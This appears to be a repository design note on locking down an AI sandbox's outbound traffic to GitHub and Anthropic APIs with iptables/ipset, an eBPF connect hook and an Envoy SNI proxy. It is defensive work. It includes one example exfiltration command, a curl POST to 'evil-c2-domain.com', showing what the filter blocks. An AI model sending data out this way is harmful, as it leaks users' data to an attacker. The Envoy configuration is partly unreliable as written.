# How can I configure eBPF or iptables rules to restrict the sandbox's outbound internet access strictly to GitHub and Anthropic APIs?

> Status in this repo: Deferred: eBPF/iptables egress policy

Restricting outbound network traffic for autonomous sandboxes to specific external APIs requires handling a fundamental networking constraint: **GitHub** publishes known CIDR blocks, but **Anthropic (`api.anthropic.com`)** sits behind Cloudflare's anycast CDN. 

If you allow Cloudflare’s entire L4 IP range via basic firewall rules, a rogue script inside the sandbox could exfiltrate data to *any* attacker-controlled website hosted behind Cloudflare.

The production standard uses a defense-in-depth approach:
1. **L4 Layer (`iptables` / `ipset` or eBPF):** Hard kernel-level firewall blocking all ports except 53 (DNS) and 443 (HTTPS), scoped to the sandbox network interface or cgroup.
2. **L7 Layer (TLS SNI Proxy):** Intercepts outbound TLS handshakes on port 443 to enforce that the `Server Name Indication` (SNI) matches **only** `api.anthropic.com` and `github.com`.

---

### Architecture Overview

```
                      [ Sandbox (gVisor Container / Firecracker) ]
                                          │
                  Outbound Request (e.g., git push or Claude API)
                                          │
                                          ▼
                ┌──────────────────────────────────────────────────┐
                │             Kernel Filtering Layer               │
                │  • iptables / eBPF (cgroup/connect4)             │
                │  • Allows Port 53 -> Local DNS Resolver only     │
                │  • Redirects Port 443 -> Local Egress Proxy      │
                │  • DROPS all other ports & egress destinations   │
                └─────────────────────────┬────────────────────────┘
                                          │
                                          ▼
                ┌──────────────────────────────────────────────────┐
                │          Egress Filtering Proxy (Envoy)          │
                │  • Inspects TLS ClientHello SNI                  │
                │  • Whitelist: *.github.com, api.anthropic.com    │
                │  • Denies all other domains                      │
                └─────────────────────────┬────────────────────────┘
                                          │
                                          ▼
                               [ Public Internet ]
                         (github.com, api.anthropic.com)
```

---

## Method 1: `iptables` + `ipset` Network Scoping

This approach binds to the bridge network interface (`br-sandbox`) dedicated to your gVisor containers or Firecracker TAP devices.

### Step 1: Create the Dedicated Docker Sandbox Network

Create an isolated bridge with direct host routing disabled:

```bash
docker network create \
  --driver bridge \
  --opt "com.docker.network.bridge.name"="br-sandbox" \
  --opt "com.docker.network.bridge.enable_icc"="false" \
  --subnet 172.28.0.0/16 \
  sandbox-net
```

### Step 2: Provision Dynamic `ipset` Rules for GitHub CIDRs

GitHub provides an API endpoint listing all current IP addresses for git and webhook delivery (`[https://api.github.com/meta](https://api.github.com/meta)`). Run this sync script on the host:

```bash
#!/usr/bin/env bash
set -euo pipefail

# 1. Initialize IP sets
ipset create -exist github_ipv4 hash:net family inet
ipset create -exist anthropic_ipv4 hash:ip family inet

# 2. Populate GitHub CIDRs directly from official metadata
echo "[+] Fetching GitHub IP ranges..."
curl -s https://api.github.com/meta | \
  jq -r '.git[] + "\n" + .web[] + "\n" + .api[]' | \
  sort -u | \
  grep -v ":" | while read -r cidr; do
    ipset add -exist github_ipv4 "$cidr"
done

# 3. Resolve Anthropic current anycast endpoints
echo "[+] Resolving Anthropic API endpoints..."
dig +short api.anthropic.com A | while read -r ip; do
  if [[ "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    ipset add -exist anthropic_ipv4 "$ip"
  fi
done
```

### Step 3: Enforce `iptables` Egress Lockdown

Apply firewall rules targeting traffic leaving the sandbox bridge (`br-sandbox`):

```bash
#!/usr/bin/env bash
set -euo pipefail

DEV="br-sandbox"
LOCAL_DNS="172.28.0.1" # Bridge gateway hosting trusted DNS resolver

# 1. Flush existing custom sandbox chain
iptables -N SANDBOX_EGRESS 2>/dev/null || iptables -F SANDBOX_EGRESS

# Route traffic from sandbox bridge into our custom chain
iptables -D FORWARD -i "$DEV" -j SANDBOX_EGRESS 2>/dev/null || true
iptables -I FORWARD 1 -i "$DEV" -j SANDBOX_EGRESS

# 2. Allow established and related return traffic
iptables -A SANDBOX_EGRESS -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# 3. Restrict DNS strictly to the local resolver (prevents DNS exfiltration tunneling)
iptables -A SANDBOX_EGRESS -p udp -d "$LOCAL_DNS" --dport 53 -j ACCEPT
iptables -A SANDBOX_EGRESS -p tcp -d "$LOCAL_DNS" --dport 53 -j ACCEPT

# 4. Allow egress to GitHub IP sets (HTTPS port 443 & Git SSH port 22)
iptables -A SANDBOX_EGRESS -p tcp -m set --match-set github_ipv4 dst --dport 443 -j ACCEPT
iptables -A SANDBOX_EGRESS -p tcp -m set --match-set github_ipv4 dst --dport 22 -j ACCEPT

# 5. Allow egress to Anthropic IP sets (HTTPS port 443)
iptables -A SANDBOX_EGRESS -p tcp -m set --match-set anthropic_ipv4 dst --dport 443 -j ACCEPT

# 6. Default DROP all remaining outbound connections with logging
iptables -A SANDBOX_EGRESS -m limit --limit 5/min -j LOG --log-prefix "[SANDBOX BLOCKED] " --log-level 4
iptables -A SANDBOX_EGRESS -j DROP
```

---

## Method 2: Kernel-Level Socket Filtering via eBPF (`cgroup/connect4`)

Instead of inspecting packets on virtual network devices, eBPF intercepts the `connect()` system call at the **socket layer** inside the host kernel before any network packet is created.

This attaches directly to the container’s cgroup directory (e.g., `/sys/fs/cgroup/docker/<container-id>`), making it impossible for untrusted code inside the sandbox to bypass.

### 1. eBPF C Hook (`restrict_egress.bpf.c`)

```c
#include <linux/bpf.h>
#include <linux/in.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

#define AF_INET 2

// Trie structure for fast prefix/subnet match (LPM)
struct lpm_key {
    __u32 prefixlen;
    __u32 data;
};

struct {
    __uint(type, BPF_MAP_TYPE_LPM_TRIE);
    __uint(max_entries, 1024);
    __type(key, struct lpm_key);
    __type(value, __u32); // 1 = ALLOW
    __uint(map_flags, BPF_F_NO_PREALLOC);
} allowed_ips SEC(".maps");

SEC("cgroup/connect4")
int sock_egress_filter(struct bpf_sock_addr *ctx) {
    // Only filter IPv4 TCP
    if (ctx->user_family != AF_INET || ctx->protocol != IPPROTO_TCP) {
        return 1;
    }

    __u16 dport = bpf_ntohs(ctx->user_port);
    __u32 dip = ctx->user_ip4;

    // Allow standard DNS to local gateway
    if (dport == 53) {
        return 1;
    }

    // Only inspect HTTPS (443) and Git SSH (22)
    if (dport != 443 && dport != 22) {
        return 0; // Connection refused (EPERM)
    }

    struct lpm_key key = {
        .prefixlen = 32,
        .data = dip
    };

    __u32 *allowed = bpf_map_lookup_elem(&allowed_ips, &key);
    if (allowed && *allowed == 1) {
        return 1; // Allow socket to connect
    }

    // Block all other IPs immediately
    return 0;
}

char _license[] SEC("license") = "GPL";
```

### 2. Compilation and Attachment via `bpftool`

```bash
# 1. Compile eBPF program with clang
clang -O2 -target bpf -c restrict_egress.bpf.c -o restrict_egress.bpf.o

# 2. Pin map and load program into BPF filesystem
mkdir -p /sys/fs/bpf/sandbox
bpftool prog load restrict_egress.bpf.o /sys/fs/bpf/sandbox/egress_prog type cgroup/connect4 pinmaps /sys/fs/bpf/sandbox

# 3. Populate an allowed GitHub IP (e.g. 140.82.112.0/20) into the LPM Trie
# Prefix 20 = hex 0x14, IP 140.82.112.0 = hex 0x0070528c (in network byte order)
bpftool map update pinned /sys/fs/bpf/sandbox/allowed_ips \
  key hex 14 00 00 00 8c 52 70 00 \
  value hex 01 00 00 00

# 4. Attach the filter to the target Docker cgroup
CGROUP_PATH="/sys/fs/cgroup/system.slice/docker-<CONTAINER_ID>.scope"
bpftool cgroup attach "$CGROUP_PATH" cgroup_inet4_connect pinned /sys/fs/bpf/sandbox/egress_prog
```

Any `connect()` attempt initiated inside the sandboxed container to unauthorized IPs or unapproved ports fails instantly with `ECONNREFUSED` / `EPERM` at the syscall entry.

---

## Method 3: The Production Golden Path (Transparent SNI Egress Proxy)

Because Cloudflare IPs rotate continuously and host millions of arbitrary domains, pure L4 IP filtering is insufficient for locking down `api.anthropic.com`. 

The secure architecture routes outbound HTTPS traffic through a transparent local **Envoy** proxy that validates the TLS SNI header.

### Step 1: Minimal Envoy SNI Filter Configuration (`envoy-egress.yaml`)

```yaml
static_resources:
  listeners:
  - name: egress_sni_listener
    address:
      socket_address:
        address: 0.0.0.0
        port_value: 8443
    listener_filters:
    - name: envoy.filters.listener.tls_inspector
      typed_config:
        "@type": type.googleapis.com/envoy.extensions.filters.listener.tls_inspector.v3.TlsInspector
    filter_chains:
    # 1. Rule for Anthropic API
    - filter_chain_match:
        server_names: ["api.anthropic.com"]
      filters:
      - name: envoy.filters.network.tcp_proxy
        typed_config:
          "@type": type.googleapis.com/envoy.extensions.filters.network.tcp_proxy.v3.TcpProxy
          stat_prefix: anthropic_egress
          cluster: dynamic_forward_proxy_cluster
    # 2. Rule for GitHub Web & API
    - filter_chain_match:
        server_names: ["github.com", "api.github.com", "*.github.com"]
      filters:
      - name: envoy.filters.network.tcp_proxy
        typed_config:
          "@type": type.googleapis.com/envoy.extensions.filters.network.tcp_proxy.v3.TcpProxy
          stat_prefix: github_egress
          cluster: dynamic_forward_proxy_cluster

  clusters:
  - name: dynamic_forward_proxy_cluster
    connect_timeout: 5s
    type: LOGICAL_DNS
    dns_lookup_family: V4_ONLY
    lb_policy: ROUND_ROBIN
    load_assignment:
      cluster_name: dynamic_forward_proxy_cluster
      endpoints:
      - lb_endpoints:
        - endpoint:
            address:
              socket_address:
                address: "%DOWNSTREAM_SNI%"
                port_value: 443
```

### Step 2: Route Sandbox Port 443 to the Envoy Proxy via `iptables`

```bash
# Redirect all HTTPS egress originating from the sandbox bridge directly to Envoy's port 8443
iptables -t nat -A PREROUTING -i br-sandbox -p tcp --dport 443 -j REDIRECT --to-port 8443
```

### How This Blocks Exploits:
* An attacker running code inside the sandbox executes `curl -X POST [https://evil-c2-domain.com](https://evil-c2-domain.com)`.
* The TCP connection connects to port 443, gets routed to the Envoy proxy.
* Envoy inspects the unencrypted `ClientHello` TLS packet.
* Because `evil-c2-domain.com` is not in the whitelist, Envoy drops the TLS handshake immediately—even if `evil-c2-domain.com` is hosted behind the same Cloudflare IP range as Anthropic.
